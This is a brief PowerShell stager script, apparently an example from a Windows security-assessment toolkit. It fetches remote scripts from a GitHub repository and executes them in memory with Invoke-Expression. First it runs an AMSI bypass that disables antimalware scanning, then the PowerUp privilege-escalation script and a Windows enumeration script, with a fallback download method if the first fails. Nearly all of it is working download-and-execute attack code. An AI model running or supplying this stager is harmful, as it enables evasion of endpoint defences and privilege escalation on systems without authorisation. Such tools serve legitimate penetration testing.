#Example how to use -ScriptPath with Test-Windows.ps1 functions
function Invoke-Stager{
    try{
        Invoke-Expression (New-Object net.webclient).DownloadString('https://raw.githubusercontent.com/cube0x0/Security-Assessment/master/Testing/ASBBypass.ps1') | Out-Null
        Invoke-Expression (New-Object net.webclient).DownloadString('https://raw.githubusercontent.com/cube0x0/Security-Assessment/master/Testing/PowerUp.ps1')
        Invoke-Expression (New-Object net.webclient).DownloadString('https://raw.githubusercontent.com/cube0x0/Security-Assessment/master/Testing/Invoke-WinEnum.ps1')
        $check=$true
    }catch{
        Write-Output "[-] $($_.Exception.Message)"
        Write-Output "[-] Invoke-Expression (New-Object net.webclient).DownloadString Failed"
    }
    if(-not($check)){
        try{
            Invoke-Expression (Invoke-WebRequest -UseBasicParsing -Uri 'https://raw.githubusercontent.com/cube0x0/Security-Assessment/master/Testing/ASBBypass.ps1').content  | Out-Null
            Invoke-Expression (Invoke-WebRequest -UseBasicParsing -Uri 'https://raw.githubusercontent.com/cube0x0/Security-Assessment/master/Testing/PowerUp.ps1').content 
            Invoke-Expression (Invoke-WebRequest -UseBasicParsing -Uri 'https://raw.githubusercontent.com/cube0x0/Security-Assessment/master/Testing/Invoke-WinEnum.ps1').content 
        }catch{
            Write-Output "[-] $($_.Exception.Message)"
            Write-Output "[-] Invoke-WebRequest Failed"
            return
        }
    }
    Invoke-WinEnum
}
Invoke-Stager
